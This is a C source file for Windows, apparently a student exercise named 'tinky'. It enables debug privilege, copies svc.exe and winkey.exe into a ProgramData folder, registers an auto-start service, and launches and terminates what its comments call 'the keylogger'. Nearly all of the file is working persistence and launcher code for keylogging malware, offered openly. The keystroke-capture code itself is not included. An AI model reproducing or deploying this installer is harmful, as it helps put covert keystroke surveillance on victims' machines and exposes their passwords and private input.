#define _CRT_SECURE_NO_WARNINGS
#define _WIN32_WINNT 0x0A00  // Define Windows 10 as the minimum version
#define NTDDI_VERSION 0x0A000000

#include <windows.h>
#include <stdio.h>
#include <tchar.h>
#include <shlobj.h>  // For SHGetFolderPath
#include <shellapi.h>  // For SHGetFolderPath
#include <tlhelp32.h>  // For taking process snapshots

#define SERVICE_NAME  L"tinky"
#define DEST_SUBDIR   L"\\TinkyWinky"  // Subdirectory within ProgramData

// Function prototypes
void InstallService(void);
void RemoveService(void);
void StartInstalledService(void);
void StartKeylogger(void);
void StopKeylogger(void);
void ElevatePrivileges(void);
void PrintError(const wchar_t* message);
void CopyExecutables(void);
void RemoveExecutables(void);
int CheckExecutableExistence(void);
void GetDestinationPath(wchar_t* destPath, size_t size);

int main(int argc, char* argv[]) {
    if (!CheckExecutableExistence()) {
        wprintf(L"Error: Required executables not found in current directory.\n");
        return 1;  // Executables not found, exiting
    }

    if (argc > 1) {
        if (strcmp(argv[1], "install") == 0) {
            ElevatePrivileges();  // Try to elevate privileges if not running as admin
            CopyExecutables();  // Copy necessary files on installation
            InstallService();
            StartInstalledService();  // Start the service after installation
        } else if (strcmp(argv[1], "remove") == 0) {
            ElevatePrivileges();  // Try to elevate privileges if not running as admin
            RemoveService();  // Remove the service
            RemoveExecutables();  // Delete the files on removal
        }
        return 0;
    }

    wprintf(L"Usage: %hs <install/remove>\n", argv[0]);
    return 0;
}

// Elevates privileges (if not running as administrator)
void ElevatePrivileges(void) {
    HANDLE hToken;
    TOKEN_PRIVILEGES tkp;

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        PrintError(L"Failed to open process token.");
        return;
    }

    LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &tkp.Privileges[0].Luid);
    tkp.PrivilegeCount = 1;
    tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    AdjustTokenPrivileges(hToken, FALSE, &tkp, sizeof(TOKEN_PRIVILEGES), NULL, NULL);
    if (GetLastError() != ERROR_SUCCESS) {
        PrintError(L"Failed to adjust token privileges.");
    }
    CloseHandle(hToken);
}

// Prints the error message with the specific error code
void PrintError(const wchar_t* message) {
    DWORD error = GetLastError();
    LPWSTR errorMessage = NULL;

    FormatMessageW(
        FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
        NULL,
        error,
        0,
        (LPWSTR)&errorMessage,
        0,
        NULL
    );

    wprintf(L"%s. Error: %lu - %s\n", message, error, errorMessage);
    LocalFree(errorMessage);
}

// Function to install the service
void InstallService(void) {
    wchar_t destSvc[MAX_PATH];
    GetDestinationPath(destSvc, MAX_PATH);
    wcscat_s(destSvc, MAX_PATH, L"\\winkey.exe");  // Use winkey.exe as the executable

    SC_HANDLE hSCManager = OpenSCManagerW(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
    if (!hSCManager) {
        PrintError(L"Cannot open Service Control Manager");
        return;
    }

    SC_HANDLE hService = CreateServiceW(
        hSCManager,
        SERVICE_NAME,
        SERVICE_NAME,
        SERVICE_ALL_ACCESS,
        SERVICE_WIN32_OWN_PROCESS,
        SERVICE_AUTO_START,
        SERVICE_ERROR_NORMAL,
        destSvc,  // Path to winkey.exe
        NULL,
        NULL,
        NULL,
        NULL,
        NULL
    );

    if (!hService) {
        PrintError(L"Cannot create service");
        CloseServiceHandle(hSCManager);
        return;
    }

    wprintf(L"Service installed successfully.\n");
    CloseServiceHandle(hService);
    CloseServiceHandle(hSCManager);
}

// Function to start the installed service
void StartInstalledService(void) {
    SC_HANDLE hSCManager = OpenSCManagerW(NULL, NULL, SC_MANAGER_CONNECT);
    if (!hSCManager) {
        PrintError(L"Cannot open Service Control Manager");
        return;
    }

    SC_HANDLE hService = OpenServiceW(hSCManager, SERVICE_NAME, SERVICE_START);
    if (!hService) {
        PrintError(L"Cannot open service");
        CloseServiceHandle(hSCManager);
        return;
    }

    if (!StartServiceW(hService, 0, NULL)) {
        PrintError(L"Cannot start service");
    } else {
        wprintf(L"Service started successfully.\n");
        StartKeylogger();  // Start the keylogger when the service starts
    }

    CloseServiceHandle(hService);
    CloseServiceHandle(hSCManager);
}

// Function to start the keylogger (winkey.exe)
void StartKeylogger(void) {
    wchar_t destPath[MAX_PATH];
    GetDestinationPath(destPath, MAX_PATH);
    wcscat_s(destPath, MAX_PATH, L"\\winkey.exe");

    // Check if winkey.exe is already running
    HANDLE hProcessSnap;
    PROCESSENTRY32 pe32;
    hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hProcessSnap == INVALID_HANDLE_VALUE) {
        PrintError(L"Failed to create process snapshot");
        return;
    }

    pe32.dwSize = sizeof(PROCESSENTRY32);
    if (!Process32First(hProcessSnap, &pe32)) {
        CloseHandle(hProcessSnap);
        return;
    }

    BOOL alreadyRunning = FALSE;
    do {
        if (wcscmp(pe32.szExeFile, L"winkey.exe") == 0) {
            wprintf(L"winkey.exe is already running.\n");
            alreadyRunning = TRUE;
            break;
        }
    } while (Process32Next(hProcessSnap, &pe32));

    CloseHandle(hProcessSnap);

    if (!alreadyRunning) {
        // Launch the keylogger
        STARTUPINFOW si = { sizeof(si) };
        PROCESS_INFORMATION pi;
        if (!CreateProcessW(destPath, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
            PrintError(L"Failed to start winkey.exe");
        } else {
            wprintf(L"winkey.exe started successfully.\n");
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
        }
    }
}

// Function to stop the keylogger (winkey.exe)
void StopKeylogger(void) {
    HANDLE hProcessSnap;
    PROCESSENTRY32 pe32;
    hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hProcessSnap == INVALID_HANDLE_VALUE) {
        PrintError(L"Failed to create process snapshot");
        return;
    }

    pe32.dwSize = sizeof(PROCESSENTRY32);
    if (!Process32First(hProcessSnap, &pe32)) {
        CloseHandle(hProcessSnap);
        return;
    }

    do {
        if (wcscmp(pe32.szExeFile, L"winkey.exe") == 0) {
            HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, pe32.th32ProcessID);
            if (hProcess == NULL) {
                PrintError(L"Failed to open winkey.exe process");
            } else {
                TerminateProcess(hProcess, 0);
                CloseHandle(hProcess);
                wprintf(L"winkey.exe terminated successfully.\n");
            }
            break;
        }
    } while (Process32Next(hProcessSnap, &pe32));

    CloseHandle(hProcessSnap);
}

// Function to remove the service and stop the keylogger
void RemoveService(void) {
    SC_HANDLE hSCManager = OpenSCManagerW(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
    if (!hSCManager) {
        PrintError(L"Cannot open Service Control Manager");
        return;
    }

    SC_HANDLE hService = OpenServiceW(hSCManager, SERVICE_NAME, DELETE | SERVICE_STOP | SERVICE_QUERY_STATUS);
    if (!hService) {
        PrintError(L"Cannot open service");
        CloseServiceHandle(hSCManager);
        return;
    }

    // Try to stop the service if it's running
    SERVICE_STATUS_PROCESS ssp;
    DWORD bytesNeeded;
    if (QueryServiceStatusEx(hService, SC_STATUS_PROCESS_INFO, (LPBYTE)&ssp, sizeof(SERVICE_STATUS_PROCESS), &bytesNeeded)) {
        if (ssp.dwCurrentState != SERVICE_STOPPED) {
            wprintf(L"Stopping service...\n");
            ControlService(hService, SERVICE_CONTROL_STOP, (LPSERVICE_STATUS)&ssp);
            Sleep(1000);  // Wait for a moment for the service to stop
        }
    }

    // Stop the keylogger if running
    StopKeylogger();

    // Delete the service
    if (!DeleteService(hService)) {
        PrintError(L"Cannot delete service");
    } else {
        wprintf(L"Service deleted successfully.\n");
    }

    CloseServiceHandle(hService);
    CloseServiceHandle(hSCManager);
}

// Function to check if svc.exe and winkey.exe exist in the current directory
int CheckExecutableExistence(void) {
    WIN32_FIND_DATAW findFileData;
    HANDLE hFind;

    // Check if svc.exe exists in the current directory
    hFind = FindFirstFileW(L"svc.exe", &findFileData);
    if (hFind == INVALID_HANDLE_VALUE) {
        wprintf(L"Error: svc.exe not found.\n");
        return 0;  // svc.exe not found
    }
    FindClose(hFind);

    // Check if winkey.exe exists in the current directory
    hFind = FindFirstFileW(L"winkey.exe", &findFileData);
    if (hFind == INVALID_HANDLE_VALUE) {
        wprintf(L"Error: winkey.exe not found.\n");
        return 0;  // winkey.exe not found
    }
    FindClose(hFind);

    return 1;  // Both files exist
}

// Get the destination path in ProgramData
void GetDestinationPath(wchar_t* destPath, size_t size) {
    SHGetFolderPathW(NULL, CSIDL_COMMON_APPDATA, NULL, 0, destPath);  // Get C:\ProgramData
    wcscat_s(destPath, size, DEST_SUBDIR);  // Add the TinkyWinky subdirectory
}

// Copy svc.exe and winkey.exe to the destination directory
void CopyExecutables(void) {
    wchar_t destPath[MAX_PATH];
    GetDestinationPath(destPath, MAX_PATH);

    if (CreateDirectoryW(destPath, NULL) || GetLastError() == ERROR_ALREADY_EXISTS) {
        // Copy svc.exe
        wchar_t srcSvc[MAX_PATH], destSvc[MAX_PATH];
        GetModuleFileNameW(NULL, srcSvc, MAX_PATH);  // Current path of svc.exe
        swprintf(destSvc, MAX_PATH, L"%s\\svc.exe", destPath);
        if (!CopyFileW(srcSvc, destSvc, FALSE)) {
            PrintError(L"Error: Could not copy svc.exe to destination");
        } else {
            wprintf(L"svc.exe copied successfully.\n");
        }

        // Copy winkey.exe
        wchar_t srcKeylogger[MAX_PATH], destKeylogger[MAX_PATH];
        swprintf(srcKeylogger, MAX_PATH, L"winkey.exe");  // Assumes it's in the same directory
        swprintf(destKeylogger, MAX_PATH, L"%s\\winkey.exe", destPath);
        if (!CopyFileW(srcKeylogger, destKeylogger, FALSE)) {
            PrintError(L"Error: Could not copy winkey.exe to destination");
        } else {
            wprintf(L"winkey.exe copied successfully to: %s\n", destKeylogger);  // Print the destination directory
        }
    } else {
        PrintError(L"Error: Could not create destination directory");
    }
}


// Remove the copied files and the destination directory
void RemoveExecutables(void) {
    wchar_t destPath[MAX_PATH];
    GetDestinationPath(destPath, MAX_PATH);

    // Delete svc.exe
    wchar_t destSvc[MAX_PATH];
    swprintf(destSvc, MAX_PATH, L"%s\\svc.exe", destPath);
    if (!DeleteFileW(destSvc)) {
        PrintError(L"Error: Could not delete svc.exe");
    } else {
        wprintf(L"svc.exe deleted successfully.\n");
    }

    // Delete winkey.exe
    wchar_t destKeylogger[MAX_PATH];
    swprintf(destKeylogger, MAX_PATH, L"%s\\winkey.exe", destPath);
    if (!DeleteFileW(destKeylogger)) {
        PrintError(L"Error: Could not delete winkey.exe");
    } else {
        wprintf(L"winkey.exe deleted successfully.\n");
    }

    // Delete the directory if empty
    if (!RemoveDirectoryW(destPath)) {
        PrintError(L"Error: Could not delete directory");
    } else {
        wprintf(L"Directory deleted successfully.\n");
    }
}
